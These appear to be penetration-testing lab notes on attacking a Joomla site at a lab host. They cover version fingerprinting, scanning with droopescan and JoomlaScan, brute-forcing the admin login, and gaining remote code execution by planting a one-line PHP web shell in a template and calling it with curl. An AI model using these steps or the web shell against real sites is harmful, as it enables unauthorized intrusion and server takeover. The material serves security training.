
# Discovery/Footprinting
    
`$ curl -s http://dev.inlanefreight.local/ | grep Joomla`

We can fingerprint the Joomla version if the README.txt file is present.

`$ curl -s http://dev.inlanefreight.local/README.txt | head -n 5`

In certain Joomla installs, we may be able to fingerprint the version from JavaScript files in the **media/system/js/** directory or by browsing to **administrator/manifests/files/joomla.xml** .

`$ curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -`

The cache.xml file can help to give us the approximate version. It is located at `plugins/system/cache/cache.xml`


        
# Enumeration


    
Let's try out droopescan, a plugin-based scanner that works for SilverStripe, WordPress, and Drupal with limited functionality for Joomla and Moodle.

```

$ sudo pip3 install droopescan
$ droopescan scan joomla --url http://dev.inlanefreight.local/
```

We can also try out JoomlaScan, which is a Python tool inspired by the now-defunct OWASP joomscan tool. JoomlaScan is a bit out-of-date and requires Python2.7 to run. We can get it running by first making sure some dependencies are installed.

```
$ sudo python2.7 -m pip install urllib3
$ sudo python2.7 -m pip install certifi
$ sudo python2.7 -m pip install bs4
$ python2.7 joomlascan.py -u http://dev.inlanefreight.local

```


# User enumeration

The administrator login portal is located at `http://dev.inlanefreight.local/administrator/index.php`. Attempts at user enumeration return a generic error message.

The default administrator account on Joomla installs is admin, but the password is set at install time, so the only way we can hope to get into the admin back-end is if the account is set with a very weak/common password and we can get in with some guesswork or light brute-forcing. We can use this script to attempt to brute force the login.

[joomla-bruteforce](  https://github.com/ajnik/joomla-bruteforce   )

`$ sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin`



# Abusing Built-In Functionality

    
we would like to add a snippet of PHP code to gain RCE. 

We can do this by customizing a template.

From here, we can click on Templates on the bottom left under Configuration to pull up the templates menu.

Next, we can click on a template name.  

This will bring us to the Templates: Customise page.

Finally, we can click on a page to pull up the page source. 

`system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);`

`$ curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id`



         

    